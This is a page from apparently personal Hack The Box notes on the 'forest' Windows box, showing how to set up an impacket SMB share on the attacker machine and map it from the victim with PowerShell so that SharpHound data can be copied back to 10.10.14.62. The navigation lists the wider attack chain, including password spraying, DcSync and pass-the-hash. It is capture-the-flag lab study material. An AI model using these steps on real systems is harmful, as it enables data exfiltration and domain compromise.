<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>OR set up smb share between attack and victim machines</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--forest.html">forest</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator.html">nmapAutomator</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_quickscan.html">nmap quickscan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_basic_scan.html">nmap basic scan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_UDP_scan.html">nmap UDP scan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_full_scan.html">nmap full scan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_vulns_scan.html">nmap vulns scan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--Recon_Recommendations.html">Recon Recommendations</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--Recon_Recommendations--smb_recon.html">smb recon</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--Recon_Recommendations--ldap_recon.html">ldap recon</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap.html">ldap</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--recon_suggestion_from_nmapAuto.html">recon suggestion from nmapAuto</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC.html">ldapsearch w/ DC</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--grep_-i_memberof.html">grep -i memberof</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--search_objectclass_person.html">search objectclass person</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--search_objectclass_person--grep_sAMAccountName.html">grep sAMAccountName</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--search_objectclass_person--userlist.ldap.html">userlist.ldap</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--search_objectclass_person--extra_username_in_rpcclient.html">extra username in rpcclient</a></li>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold.html">Initial Foothold </a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--smb.html">smb</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list.html">password spray user accts w/ custom password list</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--hashcat_best64_rule.html">hashcat best64 rule</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--add_!s_-_toggle1.rule.html">add !s / toggle1.rule</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--make_passwords_length_7_minimum.html">make passwords length 7 minimum</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--crackmapexec.html">crackmapexec</a></li>
<ol>
<li><a href="-forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--crackmapexec--null_authentication_allows_domain_enumeration.html">null authentication allows domain enumeration</a></li>
<li><a href="heBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--crackmapexec--crackmapexec_Brute_Force.html">crackmapexec Brute Force</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--enum4linux.html">enum4linux</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--getNPUsers.py.html">getNPUsers.py</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--getNPUsers.py--hashcat_BF_ticket.html">hashcat BF ticket</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--getNPUsers.py--evil-winrm.html">evil-winrm</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc.html">privesc</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--sharphound.html">sharphound</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--sharphound--run_SharpHound.exe_on_victim.html">run SharpHound.exe on victim</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--sharphound--encode-copy-paste_files_back_to_attack_machine.html">encode/copy/paste files back to attack machine</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--sharphound--OR_set_up_smb_share_between_attack_and_victim_machines.html">OR set up smb share between attack and victim machines</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j.html">neo4j</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j--bloodhound.html">bloodhound</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j--shortest_path_from_owned_Principals.html">shortest path from owned Principals</a></li>
<ol>
<li><a href="ox--Windows_Boxes--forest--privesc--neo4j--shortest_path_from_owned_Principals--query_shortest_path_to_domain_admin_from_owned_principles.html">query: shortest path to domain admin from owned principles</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j--shortest_path_from_owned_Principals--WritedACL_Abuse_info.html">WritedACL Abuse info</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j--report_summary.html">report summary</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath.html">attackpath</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Create_a_user_on_the_domain.html">Create a user on the domain</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Add_the_user_to_the_Exchange_Windows_Permission_group.html">Add the user to the Exchange Windows Permission group</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Give_the_user_DcSync_privileges.html">Give the user DcSync privileges</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Give_the_user_DcSync_privileges--Add-DomainObjectAcl_error.html">Add-DomainObjectAcl error</a></li>
</ol>
<li><a href="cktheBox--Windows_Boxes--forest--privesc--attackpath--Perform_a_DcSync_attack_and_dump_the_password_hashes_of_all_the_users_on_the_domain.html">Perform a DcSync attack and dump the password hashes of all the users on the domain</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Perform_a_Pass_the_Hash_attack_to_get_access_to_the_administrator’s_account.html">Perform a Pass the Hash attack to get access to the administrator’s account</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Lessons_Learned.html">Lessons Learned</a></li>
</ol></div>
<div class="page"><h1><b><u>OR set up smb share between attack and victim machines</u></b></h1><span style="color:#24ff00;">first we want to set up our smb server on our attacking machine, we'll use </span><span style="color:#ffa500;">impacket's -smbserver </span><span style="color:#24ff00;">to initialize it<br /><br /></span><span style="color:#ffa500;">impacket -smbserver PleaseSubscribe $(pwd) -smb2support -user ippsec -password SupportMeOnPatreon</span><span style="color:#24ff00;"><br />where<br />name is </span><span style="color:#ffa500;">PleaseSubscribe</span><br /><span style="color:#ffa500;">$(PWD) </span><span style="color:#24ff00;">shares the current directory  <br />-smb2support<br />-user set to </span><span style="color:#ffa500;">ippsec</span><span style="color:#24ff00;"><br />-password set to </span><span style="color:#ffa500;">SupportMeOnPatreon</span><span style="color:#24ff00;"><br /><br /></span><img src="images/1179-1.png" alt="images/1179-1.png" /><br /><br /><br /><strong>from here we need to store these credentials in a variable on our victim machine</strong><br />1. set our password to the variable <span style="color:#ffa500;">$pass</span><img src="images/1179-2.png" alt="images/1179-2.png" /><span style="color:#24ff00;"><br />    </span><span style="color:#ffa500;">$pass= convertto-securestring ‘SupportMeOnPatreon’ -AsPlainText -Force</span><span style="color:#24ff00;"><br />2. now we create a </span><span style="color:#ffa500;">cred</span><span style="color:#24ff00;"> variable and add our </span><span style="color:#ffff00;">username</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">pass</span><img src="images/1179-3.png" alt="images/1179-3.png" /><span style="color:#24ff00;"><br />    </span><span style="color:#ffa500;">$cred = New-Object System.Management.Automation.PSCredential('ippsec', $pass)</span><span style="color:#24ff00;"><br />3. now we connect to our smbserver from our victim machine with this command</span><img src="images/1179-4.png" alt="images/1179-4.png" /><br /><span style="color:#ffa500;">    New-PSDrive -Name ippsec -PSProvider FileSystem -Credential $cred -Root \\10.10.14.62\PleaseSubscribe</span><span style="color:#24ff00;"><br /><br />and we're connected! impacket server shoots back this message:<br /> </span><img src="images/1179-5.png" alt="images/1179-5.png" /><img src="images/1179-6.png" alt="images/1179-6.png" /><br /><br /><br /><br /><br /></div></div>
</body></html>